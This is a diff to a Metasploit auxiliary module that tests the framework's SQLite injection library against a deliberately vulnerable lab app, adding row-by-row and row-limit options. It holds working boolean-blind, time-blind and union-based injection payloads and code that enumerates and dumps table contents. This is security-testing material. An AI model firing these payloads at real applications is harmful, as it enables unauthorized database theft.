@@ -8,10 +8,10 @@ class MetasploitModule < Msf::Auxiliary
       update_info(
         info,
         'Name' => 'SQLite injection testing module',
-        'Description' => %q{
+        'Description' => '
           This module tests the SQL injection library against the  SQLite database management system
           The target : https://github.com/incredibleindishell/sqlite-lab
-        },
+        ',
         'Author' =>
           [
             'Redouane NIBOUCHA <rniboucha[at]yahoo.fr>'
@@ -30,26 +30,29 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('TARGETURI', [true, 'The target URI', '/']),
         OptInt.new('SqliType', [true, '0)Regular. 1) BooleanBlind. 2)TimeBlind', 0]),
         OptString.new('Encoder', [false, 'an encoder to use (hex for example)', '']),
-        OptBool.new('HexEncodeStrings', [false, 'Replace strings in the query with hex numbers?', false]),
-        OptInt.new('TruncationLength', [true, 'Test SQLi with truncated output (0 or negative to disable)', 0])
+        OptBool.new('HexEncodeStrings', [true, 'Replace strings in the query with hex numbers?', false]),
+        OptInt.new('TruncationLength', [true, 'Test SQLi with truncated output (0 or negative to disable)', 0]),
+        OptBool.new('Safe', [ true, 'Dump data row-by-row ?', false ]),
+        OptInt.new('NumRows', [ false, 'Limit the number of rows to retrieve (0 or negative to disable)', 0])
       ]
     )
   end
 
   def boolean_blind
     encoder = datastore['Encoder'].empty? ? nil : datastore['Encoder'].intern
-    sqli = SQLitei::BooleanBasedBlind.new({
-      encoder: encoder,
-      hex_encode_strings: datastore['HexEncodeStrings']
-    }) do |payload|
+    sqli = create_sqli(dbms: SQLitei::BooleanBasedBlind, opts: {
+                         encoder: encoder,
+                         hex_encode_strings: datastore['HexEncodeStrings'],
+                         safe: datastore['Safe']
+                       }) do |payload|
       res = send_request_cgi({
-        'uri' => normalize_uri(target_uri.path, 'index.php'),
-        'method' => 'POST',
-        'vars_post' => {
-          'tag' => "' or #{payload}--",
-          'search' => 'Check Plan'
-        }
-      })
+                               'uri' => normalize_uri(target_uri.path, 'index.php'),
+                               'method' => 'POST',
+                               'vars_post' => {
+                                 'tag' => "' or #{payload}--",
+                                 'search' => 'Check Plan'
+                               }
+                             })
       res.body.include?('Dear')
     end
     unless sqli.test_vulnerable
@@ -62,18 +65,19 @@ class MetasploitModule < Msf::Auxiliary
   def reflected
     encoder = datastore['Encoder'].empty? ? nil : datastore['Encoder'].intern
     truncation = datastore['TruncationLength'] <= 0 ? nil : datastore['TruncationLength']
-    sqli = SQLitei::Common.new({
-      encoder: encoder,
-      hex_encode_strings: datastore['HexEncodeStrings'],
-      truncation_length: truncation
-    }) do |payload|
+    sqli = create_sqli(dbms: SQLitei::Common, opts: {
+                         encoder: encoder,
+                         hex_encode_strings: datastore['HexEncodeStrings'],
+                         truncation_length: truncation,
+                         safe: datastore['Safe']
+                       }) do |payload|
       res = send_request_cgi({
-        'uri' => normalize_uri(target_uri.path, 'index.php'),
-        'method' => 'GET',
-        'vars_get' => {
-          'tag' => "' and 1=2 union select 1,(#{payload}),3,4,5--"
-        }
-      })
+                               'uri' => normalize_uri(target_uri.path, 'index.php'),
+                               'method' => 'GET',
+                               'vars_get' => {
+                                 'tag' => "' and 1=2 union select 1,(#{payload}),3,4,5--"
+                               }
+                             })
       if !res
         ''
       else
@@ -95,18 +99,19 @@ class MetasploitModule < Msf::Auxiliary
 
   def time_blind
     encoder = datastore['Encoder'].empty? ? nil : datastore['Encoder'].intern
-    sqli = SQLitei::TimeBasedBlind.new({
-      encoder: encoder,
-      hex_encode_strings: datastore['HexEncodeStrings'],
-    }) do |payload|
+    sqli = create_sqli(dbms: SQLitei::TimeBasedBlind, opts: {
+                         encoder: encoder,
+                         hex_encode_strings: datastore['HexEncodeStrings'],
+                         safe: datastore['Safe']
+                       }) do |payload|
       res = send_request_cgi({
-        'uri' => normalize_uri(target_uri.path, 'index.php'),
-        'method' => 'POST',
-        'vars_post' => {
-          'tag' => "' or #{payload}--",
-          'search' => 'Check Plan'
-        }
-      })
+                               'uri' => normalize_uri(target_uri.path, 'index.php'),
+                               'method' => 'POST',
+                               'vars_post' => {
+                                 'tag' => "' or #{payload}--",
+                                 'search' => 'Check Plan'
+                               }
+                             })
       raise ArgumentError unless res
     end
     unless sqli.test_vulnerable
@@ -123,7 +128,11 @@ class MetasploitModule < Msf::Auxiliary
     tables.each do |table|
       columns = sqli.enum_table_columns(table)
       print_good "#{table}(#{columns.join(', ')})"
-      content = sqli.dump_table_fields(table, columns)
+      if datastore['NumRows'] > 0
+        content = sqli.dump_table_fields(table, columns, '', datastore['NumRows'])
+      else
+        content = sqli.dump_table_fields(table, columns)
+      end
       content.each do |row|
         print_good "\t" + row.join(', ')
       end
@@ -132,10 +141,10 @@ class MetasploitModule < Msf::Auxiliary
 
   def check
     res = send_request_cgi({
-      'uri' => normalize_uri(target_uri.path, 'index.php'),
-      'method' => 'GET'
-    })
-    if res && res.body.include?('--==[[IndiShell Lab]]==--')
+                             'uri' => normalize_uri(target_uri.path, 'index.php'),
+                             'method' => 'GET'
+                           })
+    if res&.body&.include?('--==[[IndiShell Lab]]==--')
       Exploit::CheckCode::Vulnerable
     else
       Exploit::CheckCode::Safe
